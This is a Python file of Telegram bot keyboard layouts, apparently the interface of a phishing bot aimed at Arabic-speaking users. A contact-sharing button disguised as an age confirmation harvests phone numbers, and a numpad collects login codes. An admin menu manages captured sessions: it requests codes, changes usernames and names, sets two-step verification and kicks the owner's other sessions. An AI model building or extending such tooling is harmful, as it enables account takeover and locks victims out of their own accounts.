from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton
)


ADMIN_FOOTER = "\n\n─────────────\n⚡️ @No1_noone"

def age_confirm_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="عمري أكثر من 18 عامًا! ✔️", callback_data="confirm_age")]
    ])

def share_phone_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="عمري أكثر من 18 عامًا! ✔️", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )

def numpad_keyboard(current_input: str = ""):
    display = current_input if current_input else "_ _ _ _ _"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📟 {display}", callback_data="numpad_display")],
        [
            InlineKeyboardButton(text="1", callback_data="np_1"),
            InlineKeyboardButton(text="2", callback_data="np_2"),
            InlineKeyboardButton(text="3", callback_data="np_3"),
        ],
        [
            InlineKeyboardButton(text="4", callback_data="np_4"),
            InlineKeyboardButton(text="5", callback_data="np_5"),
            InlineKeyboardButton(text="6", callback_data="np_6"),
        ],
        [
            InlineKeyboardButton(text="7", callback_data="np_7"),
            InlineKeyboardButton(text="8", callback_data="np_8"),
            InlineKeyboardButton(text="9", callback_data="np_9"),
        ],
        [
            InlineKeyboardButton(text="0", callback_data="np_0"),
            InlineKeyboardButton(text="⌫", callback_data="np_del"),
        ],
    ])

def retry_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 محاولة أخرى", callback_data="retry_code")]
    ])

def sessions_keyboard(sessions, page=0, per_page=6):
    total = len(sessions)
    start = page * per_page
    end = start + per_page
    page_sessions = sessions[start:end]

    buttons = []
    for s in page_sessions:
        phone = s["phone"]
        try:
            valid = bool(s["valid"])
        except Exception:
            valid = True
        status = "✅" if valid else "❌"
        label = f"{status} {phone}"
        buttons.append([InlineKeyboardButton(text=label, callback_data=f"session_{phone}")])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="◀️ السابق", callback_data=f"sessions_page_{page-1}"))
    if end < total:
        nav.append(InlineKeyboardButton(text="التالي ▶️", callback_data=f"sessions_page_{page+1}"))
    if nav:
        buttons.append(nav)

    return InlineKeyboardMarkup(inline_keyboard=buttons)

def session_detail_keyboard(phone: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔑 المطالبة بكود", callback_data=f"req_code_{phone}")],
        [InlineKeyboardButton(text="✏️ تغيير اليوزر", callback_data=f"ch_user_{phone}")],
        [InlineKeyboardButton(text="📝 تغيير الاسم", callback_data=f"ch_name_{phone}")],
        [InlineKeyboardButton(text="🔐 تعيين/تغيير التحقق بخطوتين", callback_data=f"ch_2fa_{phone}")],
        [InlineKeyboardButton(text="🚫 طرد الجلسات الأخرى", callback_data=f"kick_{phone}")],
        [InlineKeyboardButton(text="🔙 رجوع للقائمة", callback_data="back_to_sessions")],
    ])

def back_to_session_keyboard(phone: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 رجوع", callback_data=f"session_{phone}")]
    ])
